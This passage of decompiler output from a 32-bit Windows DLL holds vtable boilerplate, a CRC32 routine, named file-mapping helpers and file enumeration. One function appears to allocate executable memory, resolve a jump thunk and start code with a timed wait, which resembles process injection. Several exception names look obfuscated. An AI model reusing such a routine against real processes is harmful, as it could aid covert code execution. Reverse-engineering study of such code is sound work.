  sub_1002CC05(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002CC05) --------------------------------------------------------
void __thiscall sub_1002CC05(_DWORD *this)
{
  *this = &off_10074A90;
  sub_1000DF1A(this);
}
// 10074A90: using guessed type int (__thiscall *off_10074A90)(void *Block, char);

//----- (1002CC29) --------------------------------------------------------
_DWORD *__stdcall sub_1002CC29(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_1007396C;
  return a1;
}
// 1007396C: using guessed type int (__thiscall *off_1007396C)(void *Block, char);

//----- (1002CC57) --------------------------------------------------------
void __thiscall sub_1002CC57(_DWORD *this)
{
  *this = &off_1007396C;
  sub_1000DF1A(this);
}
// 1007396C: using guessed type int (__thiscall *off_1007396C)(void *Block, char);

//----- (1002CC7B) --------------------------------------------------------
_DWORD *__stdcall sub_1002CC7B(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_10073974;
  return a1;
}
// 10073974: using guessed type int (__thiscall *off_10073974)(void *Block, char);

//----- (1002CCA9) --------------------------------------------------------
void __thiscall sub_1002CCA9(_DWORD *this)
{
  *this = &off_10073974;
  sub_1000DF1A(this);
}
// 10073974: using guessed type int (__thiscall *off_10073974)(void *Block, char);

//----- (1002CCCD) --------------------------------------------------------
int __usercall sub_1002CCCD@<eax>(int result@<eax>)
{
  if ( *(_BYTE *)result == 0xE9 )
    result += *(_DWORD *)(result + 1) + 5;
  return result;
}

//----- (1002CCDA) --------------------------------------------------------
int __cdecl sub_1002CCDA(int a1, int a2)
{
  void *v2; // eax
  int v3; // edx

  v2 = (void *)sub_1002CCCD(a2);
  sub_1000C28D((void *)(v3 - a2), a1, v2);
  return a1;
}
// 1002CCF8: variable 'v3' is possibly undefined

//----- (1002CD14) --------------------------------------------------------
DWORD __usercall sub_1002CD14@<eax>(int a1@<edi>, _DWORD *a2, _DWORD *a3)
{
  void *v3; // esi
  _DWORD *v4; // eax
  int v5; // ecx
  DWORD v6; // esi
  int v8; // [esp+20h] [ebp-6Ch] BYREF
  int v9[3]; // [esp+24h] [ebp-68h] BYREF
  _DWORD v10[3]; // [esp+30h] [ebp-5Ch] BYREF
  int v11[5]; // [esp+3Ch] [ebp-50h] BYREF
  _DWORD v12[8]; // [esp+50h] [ebp-3Ch] BYREF
  int v13; // [esp+70h] [ebp-1Ch]
  char v14; // [esp+78h] [ebp-14h]
  int v15; // [esp+88h] [ebp-4h]

  v8 = 128;
  sub_10029947((int)v10, &v8);
  v15 = 0;
  v3 = (void *)(4 - (a2[3] & 3));
  (*(void (__thiscall **)(int, _DWORD *, int, int, int))(*(_DWORD *)a1 + 44))(
    a1,
    v12,
    (int)v3 + a2[3] + a3[3],
    64,
    4096);
  LOBYTE(v15) = 1;
  sub_1002A148(v12, a2);
  v4 = (_DWORD *)sub_1000C28D(v3, (int)v11, 0);
  LOBYTE(v15) = 6;
  sub_1002A148(v12, v4);
  LOBYTE(v15) = 1;
  sub_1000C45D(v11);
  sub_1002A148(v12, a3);
  (*(void (__thiscall **)(int, int *, int, int, _DWORD, int))(*(_DWORD *)a1 + 56))(
    a1,
    v9,
    v13,
    (int)v3 + v13 + a2[3],
    0,
    60000);
  LOBYTE(v15) = 7;
  sub_100299F4(v5, (int)v10);
  sub_10014CC5((int)v9, 30000, 0);
  v14 = 1;
  v6 = sub_1000F32C(v9);
  LOBYTE(v15) = 1;
  sub_1000F307(v9);
  LOBYTE(v15) = 0;
  sub_10029DE8((int)v12);
  v15 = -1;
  sub_10029A1B(v10);
  return v6;
}
// 1002CDFB: variable 'v5' is possibly undefined
// 1002CD14: using guessed type _DWORD var_5C[3];
// 1002CD14: using guessed type _DWORD var_3C[8];
// 1002CD14: using guessed type int var_50[5];
// 1002CD14: using guessed type int var_68[3];

//----- (1002CE5D) --------------------------------------------------------
int __stdcall sub_1002CE5D(int a1)
{
  sub_1002CE6F(a1);
  return a1;
}

//----- (1002CE6F) --------------------------------------------------------
unsigned int __stdcall sub_1002CE6F(int a1)
{
  unsigned int result; // eax
  unsigned int v2; // ecx
  int v3; // edx

  for ( result = 0; result < 0x100; ++result )
  {
    v2 = result;
    v3 = 8;
    do
    {
      if ( (v2 & 1) != 0 )
        v2 = (v2 >> 1) ^ 0xEDB88320;
      else
        v2 >>= 1;
      --v3;
    }
    while ( v3 );
    *(_DWORD *)(a1 + 4 * result) = v2;
  }
  return result;
}

//----- (1002CEA0) --------------------------------------------------------
int __usercall sub_1002CEA0@<eax>(__int32 a1@<eax>, int a2@<esi>)
{
  int v2; // eax

  sub_1002CF91(a1, a2);
  v2 = dword_10092390;
  *(_DWORD *)(a2 + 8) = 0;
  *(_DWORD *)(a2 + 4) = v2;
  return a2;
}
// 10092390: using guessed type int dword_10092390;

//----- (1002CEBB) --------------------------------------------------------
int __usercall sub_1002CEBB@<eax>(_DWORD *a1@<ecx>, int a2@<esi>)
{
  unsigned int v2; // edi
  int v3; // ecx
  int v4; // eax
  int v5; // edx
  int result; // eax
  int v7; // [esp+4h] [ebp-4h]

  *(_DWORD *)(a2 + 8) = ~*(_DWORD *)(a2 + 8);
  v2 = 0;
  v7 = sub_1000C52E(a1);
  if ( *(_DWORD *)(v3 + 12) )
  {
    v4 = *(_DWORD *)(a2 + 4);
    do
    {
      v5 = *(_DWORD *)(v4 + 4 * (unsigned __int8)(*(_DWORD *)(a2 + 8) ^ *(_BYTE *)(v2 + v7))) ^ (*(_DWORD *)(a2 + 8) >> 8);
      ++v2;
      *(_DWORD *)(a2 + 8) = v5;
    }
    while ( v2 < *(_DWORD *)(v3 + 12) );
  }
  result = ~*(_DWORD *)(a2 + 8);
  *(_DWORD *)(a2 + 8) = result;
  return result;
}
// 1002CECA: variable 'v3' is possibly undefined

//----- (1002CF03) --------------------------------------------------------
int __fastcall sub_1002CF03(int a1, char a2)
{
  unsigned int v2; // eax
  int result; // eax

  v2 = ~*(_DWORD *)(a1 + 8);
  *(_DWORD *)(a1 + 8) = v2;
  result = ~(*(_DWORD *)(*(_DWORD *)(a1 + 4) + 4 * (unsigned __int8)(v2 ^ a2)) ^ (v2 >> 8));
  *(_DWORD *)(a1 + 8) = result;
  return result;
}

//----- (1002CF3A) --------------------------------------------------------
void __thiscall sub_1002CF3A(void **this)
{
  *this = off_10074A98;
  if ( this[1] )
    j__free(this[1]);
}
// 10074A98: using guessed type int (__thiscall *off_10074A98[2])(void *Block, char);

//----- (1002CF72) --------------------------------------------------------
void **__thiscall sub_1002CF72(void **Block, char a2)
{
  sub_1002CF3A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002CF91) --------------------------------------------------------
int __userpurge sub_1002CF91@<eax>(__int32 a1@<eax>, int a2)
{
  sub_1002CFA6(a1);
  return a2;
}

//----- (1002CFA6) --------------------------------------------------------
int __usercall sub_1002CFA6@<eax>(__int32 a1@<eax>)
{
  int v1; // ecx
  int result; // eax
  void *v3; // eax
  int v4; // ecx
  _DWORD v5[2]; // [esp+10h] [ebp-18h] BYREF
  void *Block[3]; // [esp+18h] [ebp-10h] BYREF
  int v7; // [esp+24h] [ebp-4h]

  v1 = dword_10092390;
  result = _InterlockedExchange((volatile __int32 *)Block, a1);
  if ( !v1 )
  {
    sub_10012C8B(dword_1009582C, v5);
    v7 = 0;
    if ( !dword_10092390 )
    {
      v3 = operator new(0x400u);
      Block[0] = v3;
      LOBYTE(v7) = 1;
      if ( v3 )
      {
        v3 = (void *)sub_1002CE5D((int)v3);
        v4 = (int)v3;
      }
      else
      {
        v4 = 0;
      }
      LOBYTE(v7) = 0;
      _InterlockedExchange((volatile __int32 *)Block, (__int32)v3);
      dword_10092390 = v4;
      dword_10092438 = v4;
    }
    v7 = -1;
    return sub_10012CBF(v5);
  }
  return result;
}
// 10092390: using guessed type int dword_10092390;
// 10092438: using guessed type int dword_10092438;
// 1009582C: using guessed type int dword_1009582C[9];
// 1002CFA6: using guessed type _DWORD var_18[2];

//----- (1002D042) --------------------------------------------------------
char __cdecl sub_1002D042(int a1, int a2, int a3)
{
  int *v3; // eax
  const WCHAR *v4; // edi
  HANDLE v5; // eax
  DWORD LastError; // eax
  DWORD v8; // [esp-8h] [ebp-40h]
  DWORD CurrentProcessId; // [esp-4h] [ebp-3Ch]
  _DWORD pExceptionObject[2]; // [esp+10h] [ebp-28h] BYREF
  int v11[2]; // [esp+18h] [ebp-20h] BYREF
  int v12[2]; // [esp+20h] [ebp-18h] BYREF
  int v13; // [esp+28h] [ebp-10h]
  int v14; // [esp+34h] [ebp-4h]

  v13 = 0;
  v14 = 0;
  v3 = &a1;
  if ( (_BYTE)a3 )
  {
    v3 = sub_1000F0FB(v12, (int)&a1);
    LOBYTE(v14) = 1;
    v13 = 1;
  }
  sub_10009F32(v11, (int)v3);
  v14 = 3;
  if ( (v13 & 1) != 0 )
  {
    v13 &= ~1u;
    sub_10009F65(v12);
  }
  v4 = *(const WCHAR **)(v11[1] + 12);
  CurrentProcessId = GetCurrentProcessId();
  v8 = GetCurrentProcessId();
  v5 = OpenFileMappingW(4u, 0, v4);
  sub_10025D50((int)v12, v5, 0, 0, v8, CurrentProcessId);
  LOBYTE(v14) = 4;
  if ( v12[1] )
  {
    LOBYTE(v14) = 3;
    sub_1000F1E1(v12);
    LOBYTE(v14) = 0;
    sub_10009F65(v11);
    v14 = -1;
    sub_10009F65(&a1);
    return 1;
  }
  else
  {
    LastError = GetLastError();
    if ( LastError == 2 || LastError == 3 || LastError == 15 )
    {
      HIBYTE(a3) = 0;
    }
    else
    {
      if ( LastError != 5 && LastError != 32 && LastError != 33 )
      {
        sub_1000E01D(pExceptionObject);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
      }
      HIBYTE(a3) = 1;
    }
    LOBYTE(v14) = 3;
    sub_1000F1E1(v12);
    LOBYTE(v14) = 0;
    sub_10009F65(v11);
    v14 = -1;
    sub_10009F65(&a1);
    return HIBYTE(a3);
  }
}
// 1002D042: using guessed type _DWORD pExceptionObject[2];

//----- (1002D15F) --------------------------------------------------------
int __stdcall sub_1002D15F(
        int a1,
        DWORD dwMaximumSizeLow,
        LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
        int a4,
        int a5)
{
  DWORD v5; // eax
  int *v6; // eax
  _DWORD *v7; // eax
  const WCHAR *v8; // esi
  HANDLE FileMappingW; // eax
  void *v10; // esi
  LPVOID v11; // eax
  DWORD v13; // [esp-8h] [ebp-44h]
  DWORD CurrentProcessId; // [esp-4h] [ebp-40h]
  DWORD v15; // [esp-4h] [ebp-40h]
  int pExceptionObject; // [esp+10h] [ebp-2Ch] BYREF
  _DWORD v17[2]; // [esp+14h] [ebp-28h] BYREF
  int v18[2]; // [esp+1Ch] [ebp-20h] BYREF
  int v19[2]; // [esp+24h] [ebp-18h] BYREF
  int v20; // [esp+2Ch] [ebp-10h]
  int v21; // [esp+38h] [ebp-4h]
  struct _SECURITY_ATTRIBUTES *lpFileMappingAttributesa; // [esp+4Ch] [ebp+10h]

  v20 = 0;
  v21 = 0;
  *(_DWORD *)a1 = &off_10074A9C;
  CurrentProcessId = GetCurrentProcessId();
  v5 = GetCurrentProcessId();
  sub_10025D50(a1 + 4, (void *)0xFFFFFFFF, 0, 0, v5, CurrentProcessId);
  GetCurrentProcessId();
  GetCurrentProcessId();
  sub_10025F70((_DWORD *)(a1 + 12));
  LOBYTE(v21) = 2;
  v6 = &a4;
  if ( (_BYTE)lpFileMappingAttributes )
  {
    v6 = sub_1000F0FB(v18, (int)&a4);
    LOBYTE(v21) = 3;
    v20 = 1;
  }
  sub_10009F32(v19, (int)v6);
  v21 = 5;
  if ( (v20 & 1) != 0 )
  {
    v20 &= ~1u;
    sub_10009F65(v18);
  }
  v7 = sub_10018A88(v17);
  LOBYTE(v21) = 6;
  v8 = *(const WCHAR **)(v19[1] + 12);
  lpFileMappingAttributesa = *(struct _SECURITY_ATTRIBUTES **)(*v7 + 4);
  v15 = GetCurrentProcessId();
  v13 = GetCurrentProcessId();
  FileMappingW = CreateFileMappingW((HANDLE)0xFFFFFFFF, lpFileMappingAttributesa, 4u, 0, dwMaximumSizeLow, v8);
  sub_10014EC9((HANDLE *)(a1 + 4), FileMappingW, 0, 0, v13, v15);
  LOBYTE(v21) = 5;
  sub_10003D24(v17);
  v10 = *(void **)(a1 + 8);
  if ( !v10
    || (GetCurrentProcessId(),
        GetCurrentProcessId(),
        v11 = MapViewOfFile(v10, 0xF001Fu, 0, 0, dwMaximumSizeLow),
        sub_10026424(a1 + 12, (int)v11),
        !*(_DWORD *)(a1 + 16)) )
  {
    sub_1000E2E3(&pExceptionObject, 1);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  LOBYTE(v21) = 2;
  sub_10009F65(v19);
  v21 = -1;
  sub_10009F65(&a4);
  return a1;
}
// 10074A9C: using guessed type int (__thiscall *off_10074A9C)(void *Block, char);
// 1002D15F: using guessed type _DWORD var_28[2];

//----- (1002D2A2) --------------------------------------------------------
_DWORD *__thiscall sub_1002D2A2(_DWORD *Block, char a2)
{
  sub_1002D2C1(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002D2C1) --------------------------------------------------------
bool __thiscall sub_1002D2C1(_DWORD *this)
{
  *this = &off_10074A9C;
  sub_100263F3(this + 3);
  return sub_1000F1E1(this + 1);
}
// 10074A9C: using guessed type int (__thiscall *off_10074A9C)(void *Block, char);

//----- (1002D306) --------------------------------------------------------
_DWORD *__stdcall sub_1002D306(_DWORD *a1, int a2)
{
  if ( a2 )
  {
    *a1 = &unk_10073C24;
    a1[2] = &unk_10073C2C;
    sub_1000DEEF(a1 + 3);
  }
  sub_1000E2E3(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(a1[2] + 4) + 8) = &off_10073360;
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10073C1C;
  return a1;
}
// 10073360: using guessed type int (__stdcall *off_10073360)(char);
// 10073C1C: using guessed type int (__stdcall *off_10073C1C)(char);

//----- (1002D376) --------------------------------------------------------
int __thiscall sub_1002D376(_DWORD *this)
{
  int v1; // eax
  int result; // eax

  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 3) + 4) - 12) = &off_10073C1C;
  v1 = this != (_DWORD *)12 ? (unsigned int)(this - 1) : 0;
  *(_DWORD *)(*(_DWORD *)(*(_DWORD *)v1 + 4) + v1) = &off_10073360;
  result = *(_DWORD *)(*(this - 3) + 4);
  *(_DWORD *)((char *)this + result - 12) = &off_100731F0;
  return result;
}
// 100731F0: using guessed type int (__stdcall *off_100731F0)(char);
// 10073360: using guessed type int (__stdcall *off_10073360)(char);
// 10073C1C: using guessed type int (__stdcall *off_10073C1C)(char);

//----- (1002D3CB) --------------------------------------------------------
_DWORD *__stdcall sub_1002D3CB(_DWORD *a1)
{
  *a1 = &unk_10073C3C;
  a1[2] = &unk_10073C44;
  sub_1000DEEF(a1 + 3);
  sub_1002D306(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10073C34;
  return a1;
}
// 10073C34: using guessed type int (__stdcall *off_10073C34)(char);

//----- (1002D422) --------------------------------------------------------
int __thiscall sub_1002D422(_DWORD *this)
{
  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 3) + 4) - 12) = &off_10073C34;
  return sub_1002D376(this);
}
// 10073C34: using guessed type int (__stdcall *off_10073C34)(char);

//----- (1002D44E) --------------------------------------------------------
_DWORD *__stdcall sub_1002D44E(_DWORD *a1)
{
  *a1 = &unk_10073CFC;
  a1[2] = &unk_10073D04;
  sub_1000DEEF(a1 + 3);
  sub_1002D306(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10073CF4;
  return a1;
}
// 10073CF4: using guessed type int (__stdcall *off_10073CF4)(char);

//----- (1002D4A5) --------------------------------------------------------
int __thiscall sub_1002D4A5(_DWORD *this)
{
  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 3) + 4) - 12) = &off_10073CF4;
  return sub_1002D376(this);
}
// 10073CF4: using guessed type int (__stdcall *off_10073CF4)(char);

//----- (1002D4D1) --------------------------------------------------------
_DWORD *__stdcall sub_1002D4D1(_DWORD *a1)
{
  *a1 = &unk_10073D14;
  a1[2] = &unk_10073D1C;
  sub_1000DEEF(a1 + 3);
  sub_1002D306(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10073D0C;
  return a1;
}
// 10073D0C: using guessed type int (__stdcall *off_10073D0C)(char);

//----- (1002D528) --------------------------------------------------------
int __thiscall sub_1002D528(_DWORD *this)
{
  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 3) + 4) - 12) = &off_10073D0C;
  return sub_1002D376(this);
}
// 10073D0C: using guessed type int (__stdcall *off_10073D0C)(char);

//----- (1002D554) --------------------------------------------------------
_DWORD *__stdcall sub_1002D554(_DWORD *a1, int a2)
{
  if ( a2 )
  {
    *a1 = &unk_10074AA8;
    a1[2] = &unk_10074AB0;
    sub_1000DEEF(a1 + 3);
  }
  sub_1002D306(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10074AA0;
  return a1;
}
// 10074AA0: using guessed type int (__stdcall *off_10074AA0)(char);

//----- (1002D5B1) --------------------------------------------------------
char *__thiscall sub_1002D5B1(char *this, char a2)
{
  char *v2; // esi

  v2 = this - 12;
  sub_1002D5D3((int)(this - 12));
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1002D5D3) --------------------------------------------------------
void __usercall sub_1002D5D3(int a1@<eax>)
{
  _DWORD *v1; // esi

  v1 = (_DWORD *)(a1 + 12);
  sub_1002D5E8((_DWORD *)(a1 + 12));
  sub_1000DF1A(v1);
}

//----- (1002D5E8) --------------------------------------------------------
int __thiscall sub_1002D5E8(_DWORD *this)
{
  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 3) + 4) - 12) = &off_10074AA0;
  return sub_1002D376(this);
}
// 10074AA0: using guessed type int (__stdcall *off_10074AA0)(char);

//----- (1002D614) --------------------------------------------------------
_DWORD *__stdcall sub_1002D614(_DWORD *a1)
{
  *a1 = &unk_10073D2C;
  a1[2] = &unk_10073D34;
  sub_1000DEEF(a1 + 3);
  sub_1002D306(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10073D24;
  return a1;
}
// 10073D24: using guessed type int (__stdcall *off_10073D24)(char);

//----- (1002D66B) --------------------------------------------------------
int __thiscall sub_1002D66B(_DWORD *this)
{
  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 3) + 4) - 12) = &off_10073D24;
  return sub_1002D376(this);
}
// 10073D24: using guessed type int (__stdcall *off_10073D24)(char);

//----- (1002D697) --------------------------------------------------------
_DWORD *__stdcall sub_1002D697(_DWORD *a1)
{
  *a1 = &unk_10074298;
  sub_1000DEEF(a1 + 2);
  sub_1000E2E3(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10074290;
  return a1;
}
// 10074290: using guessed type int (__stdcall *off_10074290)(char);

//----- (1002D6E8) --------------------------------------------------------
int __thiscall sub_1002D6E8(_DWORD *this)
{
  int result; // eax

  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 2) + 4) - 8) = &off_10074290;
  result = *(_DWORD *)(*(this - 2) + 4);
  *(_DWORD *)((char *)this + result - 8) = &off_100731F0;
  return result;
}
// 100731F0: using guessed type int (__stdcall *off_100731F0)(char);
// 10074290: using guessed type int (__stdcall *off_10074290)(char);

//----- (1002D71D) --------------------------------------------------------
_DWORD *__stdcall sub_1002D71D(_DWORD *a1, int a2)
{
  if ( a2 )
  {
    *a1 = &unk_10074074;
    a1[2] = &unk_1007407C;
    sub_1000DEEF(a1 + 3);
  }
  sub_1002D306(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_1007406C;
  return a1;
}
// 1007406C: using guessed type int (__stdcall *off_1007406C)(char);

//----- (1002D77A) --------------------------------------------------------
int __thiscall sub_1002D77A(_DWORD *this)
{
  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 3) + 4) - 12) = &off_1007406C;
  return sub_1002D376(this);
}
// 1007406C: using guessed type int (__stdcall *off_1007406C)(char);

//----- (1002D7A6) --------------------------------------------------------
_DWORD *__stdcall sub_1002D7A6(_DWORD *a1)
{
  *a1 = &unk_1007408C;
  a1[2] = &unk_10074094;
  sub_1000DEEF(a1 + 3);
  sub_1002D71D(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10074084;
  return a1;
}
// 10074084: using guessed type int (__stdcall *off_10074084)(char);

//----- (1002D7FD) --------------------------------------------------------
int __thiscall sub_1002D7FD(_DWORD *this)
{
  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 3) + 4) - 12) = &off_10074084;
  return sub_1002D77A(this);
}
// 10074084: using guessed type int (__stdcall *off_10074084)(char);

//----- (1002D830) --------------------------------------------------------
void __thiscall sub_1002D830(_DWORD *this)
{
  *this = &off_10073DF8;
  sub_1000DF1A(this);
}
// 10073DF8: using guessed type int (__thiscall *off_10073DF8)(void *Block, char);

//----- (1002D854) --------------------------------------------------------
void __thiscall sub_1002D854(_DWORD *this)
{
  *this = &off_10074AB8;
  sub_1000DF1A(this);
}
// 10074AB8: using guessed type int (__thiscall *off_10074AB8)(void *Block, char);

//----- (1002D878) --------------------------------------------------------
_DWORD *__thiscall sub_1002D878(_DWORD *Block, char a2)
{
  sub_1002D854(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002D897) --------------------------------------------------------
void __thiscall sub_1002D897(_DWORD *this)
{
  *this = &off_10074AC0;
  sub_1002D854(this);
}
// 10074AC0: using guessed type int (__thiscall *off_10074AC0)(void *Block, char);

//----- (1002D8BB) --------------------------------------------------------
_DWORD *__thiscall sub_1002D8BB(_DWORD *Block, char a2)
{
  sub_1002D897(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002D8DA) --------------------------------------------------------
void __thiscall sub_1002D8DA(_DWORD *this)
{
  *this = &off_10074AC8;
  sub_1002D854(this);
}
// 10074AC8: using guessed type int (__thiscall *off_10074AC8)(void *Block, char);

//----- (1002D8FE) --------------------------------------------------------
_DWORD *__thiscall sub_1002D8FE(_DWORD *Block, char a2)
{
  sub_1002D8DA(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002D91D) --------------------------------------------------------
void __thiscall sub_1002D91D(_DWORD *this)
{
  *this = &off_10073DF0;
  sub_1000DF1A(this);
}
// 10073DF0: using guessed type int (__thiscall *off_10073DF0)(void *Block, char);

//----- (1002D948) --------------------------------------------------------
_DWORD *__thiscall sub_1002D948(_DWORD *Block, char a2)
{
  *Block = &off_10074AD0;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10074AD0: using guessed type int (__thiscall *off_10074AD0)(void *Block, char);

//----- (1002D96F) --------------------------------------------------------
void __cdecl __noreturn sub_1002D96F(int a1)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_1000E272(pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVRnaLirybajtn_sr__);
}
// 1002D96F: using guessed type _DWORD pExceptionObject[2];

//----- (1002D98F) --------------------------------------------------------
_DWORD *__thiscall sub_1002D98F(_DWORD *Block, char a2)
{
  sub_1002D9AE(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002D9AE) --------------------------------------------------------
void __thiscall sub_1002D9AE(_DWORD *this)
{
  *this = &off_10074ADC;
  CoUninitialize();
}
// 10074ADC: using guessed type int (__thiscall *off_10074ADC)(void *Block, char);

//----- (1002D9DE) --------------------------------------------------------
int __stdcall sub_1002D9DE(int a1, int a2)
{
  int v3[10]; // [esp+0h] [ebp-28h] BYREF

  v3[6] = (int)v3;
  sub_10009F32(v3, a2);
  v3[9] = -1;
  sub_10030E74(0, (_DWORD *)a1, v3[0], v3[1]);
  *(_DWORD *)(a1 + 616) = -1;
  *(_DWORD *)a1 = &off_10074B10;
  *(_BYTE *)(a1 + 621) = 0;
  *(_BYTE *)(a1 + 620) = 0;
  return a1;
}
// 10074B10: using guessed type int (__thiscall *off_10074B10)(void *Block, char);

//----- (1002DA3E) --------------------------------------------------------
void *__thiscall sub_1002DA3E(void *Block, char a2)
{
  sub_1002DA5D((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002DA5D) --------------------------------------------------------
void __thiscall sub_1002DA5D(int this)
{
  *(_DWORD *)this = &off_10074B10;
  if ( *(_DWORD *)(this + 616) != -1 )
    FindClose(*(HANDLE *)(this + 616));
  sub_10030ED9((int *)this);
}
// 10074B10: using guessed type int (__thiscall *off_10074B10)(void *Block, char);

//----- (1002DAB2) --------------------------------------------------------
void __thiscall sub_1002DAB2(int this, int *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  struct _WIN32_FIND_DATAW *v5; // ebx
  HANDLE FirstFileW; // eax
  DWORD v7; // eax
  int *v8; // ecx
  bool v9; // bl
  DWORD LastError; // eax
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  _DWORD *v13; // eax
  bool v14; // bl
  int v15; // ecx
  int v16; // ecx
  void *v17; // ecx
  _DWORD *v18; // eax
  void *v19; // eax
  int v20; // ecx
  int v21; // ecx
  void *v22; // ecx
  _DWORD *v23; // eax
  volatile LONG *v24; // eax
  DWORD v25; // eax
  int v26; // [esp-34h] [ebp-368h] BYREF
  int v27; // [esp-30h] [ebp-364h] BYREF
  int v28; // [esp-2Ch] [ebp-360h] BYREF
  int v29; // [esp-28h] [ebp-35Ch] BYREF
  int v30; // [esp-24h] [ebp-358h]
  int *attributes; // [esp-20h] [ebp-354h]
  int *v32; // [esp-1Ch] [ebp-350h]
  int *v33; // [esp-18h] [ebp-34Ch]
  int v34; // [esp-14h] [ebp-348h]
  PMFN pmfnUnwind; // [esp-10h] [ebp-344h]
  int (__cdecl *pForwardCompat)(); // [esp-Ch] [ebp-340h]
  CatchableTypeArray *pCatchableTypeArray; // [esp-8h] [ebp-33Ch]
  _ThrowInfo *v38; // [esp-4h] [ebp-338h]
  int v39; // [esp+0h] [ebp-334h]
  int v40[14]; // [esp+10h] [ebp-324h] BYREF
  _DWORD v41[5]; // [esp+48h] [ebp-2ECh] BYREF
  _DWORD pExceptionObject[5]; // [esp+5Ch] [ebp-2D8h] BYREF
  _DWORD v43[5]; // [esp+70h] [ebp-2C4h] BYREF
  _DWORD v44[5]; // [esp+84h] [ebp-2B0h] BYREF
  int *v45; // [esp+98h] [ebp-29Ch]
  int v46; // [esp+9Ch] [ebp-298h] BYREF
  void *Block; // [esp+A0h] [ebp-294h]
  int *v48; // [esp+A4h] [ebp-290h]
  _DWORD v49[2]; // [esp+A8h] [ebp-28Ch] BYREF
  void *v50; // [esp+B0h] [ebp-284h]
  int v51; // [esp+B4h] [ebp-280h] BYREF
  void *v52; // [esp+B8h] [ebp-27Ch]
  int v53[2]; // [esp+BCh] [ebp-278h] BYREF
  int v54; // [esp+C4h] [ebp-270h] BYREF
  volatile LONG *lpAddend; // [esp+C8h] [ebp-26Ch]
  int v56; // [esp+CCh] [ebp-268h]
  _ThrowInfo v57; // [esp+D0h] [ebp-264h] BYREF
  _ThrowInfo *v58; // [esp+E0h] [ebp-254h]
  int *v59; // [esp+E4h] [ebp-250h]
  int v60; // [esp+E8h] [ebp-24Ch]
  int v61; // [esp+F0h] [ebp-244h]
  wchar_t Source[282]; // [esp+FCh] [ebp-238h] BYREF
  int v63; // [esp+330h] [ebp-4h]

  v50 = (void *)this;
  v48 = a2;
  v56 = 0;
  if ( *(_BYTE *)(this + 620) )
  {
    sub_1002E1A8(a2, 0);
    v63 = 0;
LABEL_3:
    v56 = 1;
    goto LABEL_4;
  }
  if ( *(_DWORD *)(this + 8) + *(_DWORD *)(this + 12) )
  {
    v5 = (struct _WIN32_FIND_DATAW *)(this + 24);
    if ( FindNextFileW(*(HANDLE *)(this + 616), (LPWIN32_FIND_DATAW)(this + 24)) )
      goto LABEL_16;
    LastError = GetLastError();
    if ( LastError != 18 )
    {
      SetLastError(LastError);
      sub_10031190(v41);
      v38 = (_ThrowInfo *)&_TI4_AVAoubmBglPnbiMzvxptraa_cah_sr__;
      v4 = v41;
      goto LABEL_8;
    }
    *(_BYTE *)(this + 620) = 1;
    sub_1002E1A8(a2, 0);
    v63 = 0;
    goto LABEL_3;
  }
  sub_10009D2C(&v51, asc_1008E314);
  v63 = 1;
  v3 = sub_10030F17(this, v53);
  LOBYTE(v63) = 2;
  sub_1000A132(&v54, (int)v3, (int)&v51);
  LOBYTE(v63) = 4;
  sub_10009F65(v53);
  LOBYTE(v63) = 5;
  sub_10009F65(&v51);
  if ( *((_DWORD *)lpAddend + 7) > 0x104u )
  {
    sub_10031190(pExceptionObject);
    v38 = (_ThrowInfo *)&_TI4_AVAoubmBglPnbiMzvxptraa_cah_sr__;
    v4 = pExceptionObject;
    goto LABEL_8;
  }
  v5 = (struct _WIN32_FIND_DATAW *)(this + 24);
  FirstFileW = FindFirstFileW(*((LPCWSTR *)lpAddend + 3), (LPWIN32_FIND_DATAW)(this + 24));
  *(_DWORD *)(this + 616) = FirstFileW;
  if ( FirstFileW == (HANDLE)-1 )
  {
    v7 = GetLastError();
    if ( v7 != 2 && v7 != 5 )
    {
